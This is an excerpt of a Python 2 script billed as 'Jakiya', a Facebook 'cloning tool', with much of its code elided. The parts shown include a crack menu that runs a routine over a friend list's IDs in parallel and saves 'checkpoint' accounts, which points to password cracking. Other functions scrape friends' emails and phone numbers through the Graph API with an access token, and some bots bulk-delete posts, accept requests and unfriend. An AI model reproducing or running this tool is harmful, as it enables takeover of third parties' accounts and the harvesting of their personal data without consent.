# Tool : Jakiya ( Facebook cloning tool)
# Author : HM Borhan Uddin ( black_hole )
# github.com/HM-BORHAN-BLACK-HOLE-CYBER
...
banner = '\n\x1b[1;95mTool By Hacker jakiya\n We are not responsible for any \nillegal activity\n \n'
...
def men():
    ...
    if rana == '':
        ...
        os.system('clear')
        jakiya('[!] \x1b[1;92mPlease Wait While Page Is Loding.')
        hopss('10%..Wait.')
        hopss('20%.5..')
        hopss('50%..4.')
        hopss('70%.3..')
        ...
        os.system('clear')
        print banner
        jakiya('[\xe2\x9c\x93] \x1b[1;92mPlease Wait While Tool Is Updating')
        os.system('git pull origin master')
        jakiya('[\xe2\x9c\x93] \x1b[1;92mTool Has Been Update Successfully')
        jakiya('[\xe2\x9c\x93] \x1b[1;92mPlease Wait While Update Is Setting Up On Your Mobile Phone')
        time.sleep(3)
        os.jakiya('python2 wasi.py')
    elif rana == '6':
        os.system('xdg-open https://www.youtube.com/channel/HackerWasii')
        menu()
    elif rana == '7':
        os.system('rm -rf login.txt')
        jakiya('[\xe2\x9c\x93] Logged Out Successfully')
        os.system('python2 wasi.py')
    else:
        print '[!] \x1b[1;91mWrong Input'
        men()
...
def crack_menu():
    ...
    if crm == '':
        ...
        try:
            ...
            jakiya('\x1b[1;97m[\xe2\x9c\x93] \x1b[1;95mAccount Name \x1b[1;97m:\x1b[1;97m ' + op['name'])
        except KeyError:
        ...
        print 'Filled Incorrectly'
        crack_menu()
    jakiya('[\xe2\x9c\x93] \x1b[1;96mTotal Friends: ' + str(len(id)))
    time.sleep(0.5)
    jakiya('[\xe2\x9c\x93] \x1b[1;96mThe Process Has Been Started.')
    time.sleep(0.5)
    jakiya('[!] \x1b[1;96mTo Stop Process Press CTRL Then Z')
    time.sleep(0.5)
    print 47 * '-'
    ...
    p.map(main, id)
    print '\x1b[1;97m----------------------------------------------'
    jakiya('[\xe2\x9c\x93] \x1b[1;92mProcess Has Been Completed.')
    jakiya('\x1b[1;93m[\xe2\x9c\x93] \x1b[1;92mCheckpoint IDS Has Been Saved.')
    xx = str(len(oks))
...
def idfromfriend():
    ...
    try:
        ...
        z = json.loads(r.text)
        jakiya('[\xe2\x9c\x93] \x1b[1;92mGetting Friends Numeric IDs...')
        print '--------------------------------------'
...
def emailfromfriend():
    ...
    try:
        ...
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        jakiya('[\xe2\x9c\x93] \x1b[1;92mGetting Emails From')
        print 40 * '\x1b[1;97m-'
...
def numberfromfriend():
    ...
    try:
        ...
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        jakiya('[\xe2\x9c\x93] \x1b[1;92mGetting All Numbers')
        print 40 * '\x1b[1;97m-'
...
def deletepost():
    ...
    jakiya('[\xe2\x9c\x93] \x1b[1;92mThe Process Has Been Started')
    print 40 * '-'
...
def accept():
    ...
    if '[]' in str(teman['data']):
        ...
        raw_input('Press Enter To Back ')
        bot()
    jakiya('[\xe2\x9c\x93] The Process Has Been Start')
    print 40 * '-'
    for i in teman['data']:
...
def unfriend():
    ...
    os.system('clear')
    print banner
    jakiya('[\xe2\x9c\x93] The Process Has Been Started.')
